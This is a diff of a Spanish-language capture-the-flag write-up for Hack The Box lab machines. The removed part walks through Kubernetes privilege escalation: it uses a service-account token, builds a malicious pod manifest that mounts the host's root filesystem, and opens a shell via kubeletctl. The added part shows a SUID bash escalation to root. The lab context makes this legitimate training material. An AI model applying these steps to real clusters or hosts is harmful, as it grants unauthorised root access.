+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1ZmJjA2HOBqNCM9odLTP%2F27.png?alt=media&#x26;token=aebb103c-1376-4546-90be-a93fcaa7e6e9" alt=""><figcaption></figcaption></figure>
 
-Y ahora con este comando podremos ver las acciones que podemos hacer.
+Como nos indica esa _**s**_ que ha aparecido, ahora tiene activado el **SUID** por lo que agusutus ya podría ejecutarlo aunque no fuese suyo.
 
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqPAYUX99jMas9rrCyXOB%2F28.png?alt=media&#x26;token=36c3dc58-0542-437a-8cc8-69e23299afc2" alt=""><figcaption></figcaption></figure>
 
-```sh
-kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
+Ahora una vez nos conectamos de nuevo nos aparece en rojo, vamos a ejecutarlo.
+
+```bash
+./bash -p
 ```
 
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F7hzlHiWTshbSXobsz0bk%2F29.png?alt=media&#x26;token=8c6fb307-5e4d-44a2-951c-f6ea8b5a6ca6" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fm6WSjqwn9m7cw9yLNRMT%2F4.png?alt=media&#x26;token=54fc5d83-e0ca-4cbb-963c-57f21ed129be" alt=""><figcaption></figcaption></figure>
+Ya seríamos root, ahora solo queda ver la flag:
 
-El que más permisos tiene es el de **pods**. Vamos a ver el archivo **.yml** de pod nginx, para poder crear uno propio por nosotros malicioso.
-
-```yaml
-❯ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
-apiVersion: v1
-kind: Pod
-metadata:
-  annotations:
-    kubectl.kubernetes.io/last-applied-configuration: |
-      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}
-  creationTimestamp: "2025-03-11T18:29:02Z"
-  name: nginx
-  namespace: default
-  resourceVersion: "512"
-  uid: be93e746-687e-4ad5-a18c-63e9a9ba5a94
-spec:
-  containers:
-  - image: nginx:1.14.2
-    imagePullPolicy: Never
-    name: nginx
-    resources: {}
-    terminationMessagePath: /dev/termination-log
-    terminationMessagePolicy: File
-    volumeMounts:
-    - mountPath: /root
-      name: flag
-    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
-      name: kube-api-access-t2h5f
-      readOnly: true
-  dnsPolicy: ClusterFirst
-  enableServiceLinks: true
-  nodeName: steamcloud
-  preemptionPolicy: PreemptLowerPriority
-  priority: 0
-  restartPolicy: Always
-  schedulerName: default-scheduler
-  securityContext: {}
-  serviceAccount: default
-  serviceAccountName: default
-  terminationGracePeriodSeconds: 30
-  tolerations:
-  - effect: NoExecute
-    key: node.kubernetes.io/not-ready
-    operator: Exists
-    tolerationSeconds: 300
-  - effect: NoExecute
-    key: node.kubernetes.io/unreachable
-    operator: Exists
-    tolerationSeconds: 300
-  volumes:
-  - hostPath:
-      path: /opt/flag
-      type: ""
-    name: flag
-  - name: kube-api-access-t2h5f
-    projected:
-      defaultMode: 420
-      sources:
-      - serviceAccountToken:
-          expirationSeconds: 3607
-          path: token
-      - configMap:
-          items:
-          - key: ca.crt
-            path: ca.crt
-          name: kube-root-ca.crt
-      - downwardAPI:
-          items:
-          - fieldRef:
-              apiVersion: v1
-              fieldPath: metadata.namespace
-            path: namespace
-status:
-  conditions:
-  - lastProbeTime: null
-    lastTransitionTime: "2025-03-11T18:29:02Z"
-    status: "True"
-    type: Initialized
-  - lastProbeTime: null
-    lastTransitionTime: "2025-03-11T18:29:03Z"
-    status: "True"
-    type: Ready
-  - lastProbeTime: null
-    lastTransitionTime: "2025-03-11T18:29:03Z"
-    status: "True"
-    type: ContainersReady
-  - lastProbeTime: null
-    lastTransitionTime: "2025-03-11T18:29:02Z"
-    status: "True"
-    type: PodScheduled
-  containerStatuses:
-  - containerID: docker://417d1c5915de5032f20e85a07afc02f9aa1858cc025eb498320fb2f2329b7fd1
-    image: nginx:1.14.2
-    imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
-    lastState: {}
-    name: nginx
-    ready: true
-    restartCount: 0
-    started: true
-    state:
-      running:
-        startedAt: "2025-03-11T18:29:03Z"
-  hostIP: 10.10.11.133
-  phase: Running
-  podIP: 172.17.0.3
-  podIPs:
-  - ip: 172.17.0.3
-  qosClass: BestEffort
-  startTime: "2025-03-11T18:29:02Z"
-```
-
-La estrucrura de mi `zelpro.yml`  ser verá así.
-
-```yaml
-───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: zelpro.yml
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ apiVersion: v1
-   2   │ kind: Pod
-   3   │ metadata:
-   4   │   name: zelpro-pod
-   5   │   namespace: default
-   6   │ spec:
-   7   │   containers:
-   8   │   - name: zelpro-pod
-   9   │     image: nginx:1.14.2
-  10   │     volumeMounts:
-  11   │     - mountPath: /mnt
-  12   │       name: zelpro-privesc
-  13   │   volumes:
-  14   │   - name: zelpro-privesc
-  15   │     hostPath:
-  16   │       path: /
-───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-
-```
-
-Ahora ejecutaremos:
-
-
-```
-kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f zelpro.yml
-```
-
-
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FXFp9NTixr9hL0tExtVo3%2F5.png?alt=media&#x26;token=de9f51a0-0a2f-4e77-a7f3-5d57105ff062" alt=""><figcaption></figcaption></figure>
-
-Volveremos a escanear los pods en busca del nuestro.
-
-```
-❯ kubeletctl -s 10.10.11.133 scan rce
-┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
-│                                   Node with pods vulnerable to RCE                                  │
-├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
-│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│   │              │                                    │             │                         │ RUN │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 1 │ 10.10.11.133 │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 2 │              │ coredns-78fcd69978-lc4mh           │ kube-system │ coredns                 │ -   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 3 │              │ nginx                              │ default     │ nginx                   │ +   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 4 │              │ zelpro-pod                         │ default     │ zelpro-pod              │ +   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 5 │              │ kube-proxy-xftvs                   │ kube-system │ kube-proxy              │ +   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
-├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
-│ 9 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
-└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
-```
-
-Con el comando que ejecutamos anteriormente hacia el pod nginx para obtener una shell, lo modificaremos para que apunte a nuestro pod:
-
-```
-kubeletctl -s 10.10.11.133 exec "/bin/bash" -p zelpro-pod -c zelpro-pod
-```
-
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F53u2a8UHeiQdbGyn8gpO%2F6.png?alt=media&#x26;token=6580eca2-9e60-4d1e-a867-1c69b3823157" alt=""><figcaption></figcaption></figure>
-
-Y ya tendríamos la root flag.
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FV2fCDskeJ8UzI3YzTDqL%2F30.png?alt=media&#x26;token=ecd0289c-8cf8-4924-90ed-8d0f10b5e0d5" alt=""><figcaption></figcaption></figure>
 
 [Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/446)
 
